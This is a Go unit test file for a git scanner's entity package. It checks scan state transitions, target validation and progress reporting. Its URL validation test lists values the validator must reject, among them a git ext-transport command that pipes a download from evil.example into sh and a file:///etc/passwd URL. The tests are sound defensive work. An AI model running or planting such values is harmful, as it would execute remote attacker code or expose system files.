package entity_test

import (
	"github.com/mservice/gitscanner/libs/entity"
	"testing"
)

func TestCanTransition(t *testing.T) {
	cases := []struct {
		from, to entity.ScanState
		want     bool
	}{
		{entity.ScanQueued, entity.ScanRunning, true},
		{entity.ScanRunning, entity.ScanPaused, true},
		{entity.ScanPaused, entity.ScanRunning, true},
		{entity.ScanRunning, entity.ScanCompleted, true},
		{entity.ScanFailed, entity.ScanQueued, true},

		{entity.ScanCompleted, entity.ScanRunning, false},
		{entity.ScanCancelled, entity.ScanQueued, false},
		{entity.ScanQueued, entity.ScanCompleted, false},
		{entity.ScanPaused, entity.ScanCompleted, false},
	}

	for _, c := range cases {
		if got := entity.CanTransition(c.from, c.to); got != c.want {
			t.Errorf("CanTransition(%s, %s) = %v, want %v", c.from, c.to, got, c.want)
		}
	}
}

func TestTerminalStates(t *testing.T) {
	if !entity.ScanCompleted.Terminal() || !entity.ScanCancelled.Terminal() {
		t.Error("completed and cancelled must be terminal")
	}
	if entity.ScanFailed.Terminal() {
		t.Error("failed must not be terminal: it can be retried")
	}
	if entity.ScanRunning.Terminal() || entity.ScanPaused.Terminal() || entity.ScanQueued.Terminal() {
		t.Error("active states must not be terminal")
	}
}

// Repo URL validation is a security boundary, not formatting: the value
// reaches `git clone`, and several git transports execute commands.
func TestValidateRepoURLRejectsDangerousTransports(t *testing.T) {
	bad := []string{
		"ext::sh -c 'curl evil.example|sh'",
		"file:///etc/passwd",
		"ssh://git@github.com/a/b.git",
		"git://github.com/a/b.git",
		"https://user:token@github.com/a/b.git", // embedded credentials
		"http://github.com/a/b.git",             // plaintext
		"https://",                              // no host
	}

	for _, u := range bad {
		if err := repoTarget(u).Validate(); err == nil {
			t.Errorf("repo target %q accepted a URL it must reject", u)
		}
	}

	if err := repoTarget("https://github.com/owner/repo.git").Validate(); err != nil {
		t.Errorf("repo target rejected a valid URL: %v", err)
	}
}

func TestTargetValidate(t *testing.T) {
	if err := (entity.Target{Kind: entity.TargetUser, Value: "octocat"}).Validate(); err != nil {
		t.Errorf("valid user target rejected: %v", err)
	}
	if err := (entity.Target{Kind: entity.TargetUser, Value: "-bad-"}).Validate(); err == nil {
		t.Error("login starting with a hyphen must be rejected")
	}
	if err := (entity.Target{Kind: entity.TargetAllowlist}).Validate(); err == nil {
		t.Error("empty allowlist must be rejected")
	}
	if err := (entity.Target{Kind: "everything"}).Validate(); err == nil {
		t.Error("unknown target kind must be rejected")
	}
}

func TestProgress(t *testing.T) {
	if got := (entity.ScanJob{}).Progress(); got != 0 {
		t.Errorf("unknown total should report 0 progress, got %v", got)
	}
	if got := (entity.ScanJob{ReposTotal: 4, ReposScanned: 1}).Progress(); got != 0.25 {
		t.Errorf("progress = %v, want 0.25", got)
	}
	// Discovery can add repos after scanning starts, so scanned may briefly
	// exceed the total it was compared against.
	if got := (entity.ScanJob{ReposTotal: 2, ReposScanned: 5}).Progress(); got != 1 {
		t.Errorf("progress must clamp to 1, got %v", got)
	}
}

func repoTarget(url string) entity.Target {
	return entity.Target{Kind: entity.TargetRepo, Value: url}
}
